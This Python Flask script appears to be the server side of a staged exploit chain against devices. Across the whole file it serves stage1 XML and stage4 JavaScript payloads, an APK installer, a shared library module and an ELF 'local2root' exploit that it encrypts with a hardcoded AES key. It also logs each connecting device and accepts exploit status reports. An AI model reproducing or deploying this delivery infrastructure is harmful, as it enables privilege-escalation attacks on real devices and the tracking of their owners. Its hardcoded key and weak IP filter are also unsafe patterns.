#!/usr/bin/python

import sys
import fcntl
import datetime

# Dynamic pages
from stage1_xml import stage1_xml
from stage4_js import stage4_js

from flask import Flask, make_response, request, abort
app = Flask(__name__)

# [ Debug server configuration ] --------------------------------------------- #

# The directory prefix (needs to start with / or be blank)
PREFIX = ""

# [ PyCrypto ] --------------------------------------------------------------- #
# (on the fly encryption - local2root debug version)

KEY = 'a2b0c8a5ef11f412c267244cb1bec615661bdadeae9036c17568b0a964c5430e'.decode("hex")

from Crypto import Random
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        '''
        Initialize the AES cipher with a 32 byte key.
        '''
        self.bs = 16
        if len(key) != 32:
            raise Exception("Invalid AES256 key length")

        self.key = key

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

# ---------------------------------------------------------------------------- #

# [ Utility functions ] ------------------------------------------------------ #

def readfile(name):
    with open(name, "rb") as fp:
        content = fp.read()
    return content

def nocache(s):
    """
    Builds a response that tells the client never to cache the page with
    the specified string output.
    """

    resp = make_response(s)
    resp.headers['Cache-control'] = 'no-cache, no-store, must-revalidate'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'    

    return resp

# [ Improvised crappy security ] --------------------------------------------- #

@app.before_request
def limit_remote_addr():
    addr = request.remote_addr
    
    # Only allow connections from the RSSM/RTNU network and myself
    # This is not secure, however it will be enough against random portscans
    # on the wired network.
    if (not addr.startswith("192.168.")) and (addr != "127.0.0.1"):
        abort(403)
        
    
# [ Home page ] -------------------------------------------------------------- #
    
@app.route('/')
def hello():
    return "Hello from flask server!"

# [ Static files ] ----------------------------------------------------------- #

# Static files are explicitly defined here so it will be easier to
# understand which files will need to be deployed statically at
# prime time.

@app.route(PREFIX + '/go')
@app.route(PREFIX + '/go.htm')
@app.route(PREFIX + '/go.html')
def go_html():
    return nocache(readfile("go.html"))

@app.route(PREFIX + '/scriptid.js')
@app.route(PREFIX + '/script.js')
def script_js():
    ua = request.headers.get('User-Agent')
    do_log("--- Device connected: {}".format(request.remote_addr))
    do_log("--- {}".format(ua))
    return nocache(readfile("script.js"))
    
@app.route(PREFIX + '/scriptidm.js')
@app.route(PREFIX + '/scriptidp.js')
def script_wrong():
    return nocache(readfile("redir.js"))

@app.route(PREFIX + '/stylesheet.xsl')
def stylesheet_xsl():
    return nocache(readfile("stylesheet.xsl"))

@app.route(PREFIX + '/module.so')
def module_so():
    return nocache(readfile("module.so"))

# [ test ] -

@app.route(PREFIX + '/jswat.html')
def jswat_js():
    return nocache(readfile("jswat.html"))

@app.route(PREFIX + '/alert.html')
def alert_html():
    return nocache(readfile("alert.html"))

# ----

# [ Dynamic pages ] ---------------------------------------------------------- #

# Request format: /data.xml?id=<base>
@app.route(PREFIX + '/data.xml')
def data_xml():
    base = request.args.get('id')
    nextaddr = request.args.get('contentId')

    try:
        base = int(base) 
    except ValueError:
        base = None

    if nextaddr is not None:
        try:
            nextaddr = int(nextaddr) 
        except ValueError:
            nextaddr = None

    if base is not None:
        resp = nocache(stage1_xml(base, nextaddr=nextaddr))
    else:
        abort(404)
        # # Default response
        # resp = nocache(stage1_xml())
        
    resp.headers["Content-type"] = "application/xml"
    return resp

@app.route(PREFIX + '/stage4.js')
def stage4_js_serve():
    magic = request.args.get('trk')
    resp = nocache(stage4_js(magic))

    resp.headers["Content-type"] = "text/javascript"
    return resp

@app.route(PREFIX + '/installer.apk')
def installer_apk():
    return nocache(readfile("installer.apk"))

@app.route(PREFIX + '/exploit')
def exploit_install():
    exploit = readfile("exploit")
    if exploit.startswith("\x7fELF"):
        # Exploit is not encrypted: encrypt it on the fly
        cipher = AESCipher(KEY)
        exploit = cipher.encrypt(exploit)
        
    return nocache(exploit)

# [ Very basic server debug logger ] ----------------------------------------- #

def do_log(s):
    with open("tacgnol.log", "a") as fp:
        timestamp = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        fcntl.flock(fp, fcntl.LOCK_EX)
        fp.write("[{}] {}\n".format(timestamp, s))
        fcntl.flock(fp, fcntl.LOCK_UN)


@app.route(PREFIX + '/log/info', methods=['POST'])
def log_info():
    info = request.form["logdata"].rstrip()
    do_log(info)
    return "", 200

@app.route(PREFIX + '/log/error', methods=['POST'])
def log_error():
    info = request.form["logdata"].rstrip()
    do_log("EXPLOIT ERROR: {}".format(info))
    return "", 200

# [ Module init ] ------------------------------------------------------------ #

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=8080)

